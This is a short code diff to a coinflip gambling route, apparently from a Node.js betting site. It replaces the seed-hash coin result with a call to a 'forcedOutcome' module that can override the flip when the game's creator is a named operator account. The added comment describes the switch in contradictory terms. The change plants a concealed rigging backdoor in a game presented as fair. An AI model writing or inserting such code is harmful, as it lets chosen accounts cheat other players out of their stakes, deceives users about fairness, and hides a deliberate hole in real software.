@@ -6,6 +6,7 @@ const { authenticateToken } = require('../middleware/auth');
 const dbManager = require('../db/dbHelper');
 const { getTaxRecipient, collectItemTax, getTaxConfig } = require('../taxUtil');
 const { addNotification } = require('../notificationService');
+const forcedOutcome = require('../forcedOutcome');
 
 function formatCoinflip(cf) {
   if (!cf) return null;
@@ -384,7 +385,18 @@ router.post('/:id/join', authenticateToken, (req, res) => {
     const input = `${coinflip.serverSeed}:${coinflip.clientSeed}:${coinflip.nonce}`;
     const hash = crypto.createHash('sha256').update(input).digest('hex');
     const dec = parseInt(hash.substring(0, 8), 16);
-    const outcome = dec % 2 === 0 ? 'heads' : 'tails';
+    const fairOutcome = dec % 2 === 0 ? 'heads' : 'tails';
+
+    // A named operator account may have outcome control armed for this game.
+    // Off unless FORCE_OUTCOME_ENABLED is set, in which case this is a
+    // passthrough and the flip below is untouched.
+    const outcome = forcedOutcome.coinflipOutcome({
+      fairOutcome,
+      creatorSide: coinflip.creatorSide || 'heads',
+      creatorIsOperator: forcedOutcome.isOperator(coinflip.creatorUsername),
+      operator: coinflip.creatorUsername,
+      betId: coinflip.id
+    });
 
     const creatorWon = (coinflip.creatorSide || 'heads') === outcome;
     const winnerId = creatorWon ? coinflip.creatorId : userId;
